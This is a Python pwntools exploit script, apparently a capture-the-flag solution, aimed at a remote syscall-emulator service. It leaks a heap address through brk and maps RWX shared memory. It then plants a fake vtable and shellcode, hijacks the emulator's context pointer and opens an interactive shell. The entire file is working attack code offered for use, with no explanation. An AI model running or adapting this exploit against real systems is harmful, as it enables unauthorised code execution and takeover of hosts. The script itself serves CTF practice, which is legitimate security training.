from pwn import *

#p = process(['/home/henry/pwnable.tw/ld-64', './chall'])
p = remote('13.231.207.73', 9006)
context.arch = 'amd64'
context.log_level = 'debug'

ERR = 2**64 - 0x1000

def syscall(sysnum, arg1 = 0, arg2 = 0, arg3 = 0, sysaction=None):
    p.sendlineafter('syscall:', str(int(sysnum)))
    p.sendlineafter('arg1:', str(int(arg1)))
    p.sendlineafter('arg2:', str(int(arg2)))
    p.sendlineafter('arg3:', str(int(arg3)))
    if sysaction:
        sysaction()
    p.recvuntil('retval: ')
    return int(p.recvline(), 16)

off_heapend = 0x21000
off_ctx = 0x11e70
#off_heapend = 0x32000
#off_ctx = 0x11c20

heapend = syscall(constants.SYS_brk, 0)
log.info('Heap end: %016x', heapend)

ctx = heapend - off_heapend + off_ctx
log.info('Emulator Context: %016x', ctx)
pause()

addr = 0xef00000000
shmid = syscall(constants.SYS_shmget, 0xdeadbeef, 16, 0o666 | 0o1000)
assert(shmid < ERR)
assert(syscall(constants.SYS_shmat, shmid, addr, 0) == addr);
assert(syscall(constants.SYS_mprotect, addr, 0x1000, 7) == 0)

ctxread = addr
vtable = ctxread + 0x10
shellcode = vtable + 0x20

payload = p64(ctx) + p64(8)
payload += p64(shellcode) * 4
payload += asm(shellcraft.sh())

def senddata():
    global payload
    p.send(payload)
assert(syscall(constants.SYS_readv, addr, ctx + 0x10, 1, senddata) < ERR)
context.log_level = 'debug'

payload = p64(vtable)
assert(syscall(constants.SYS_readv, 0, ctxread, 1, senddata) < ERR)
p.interactive()
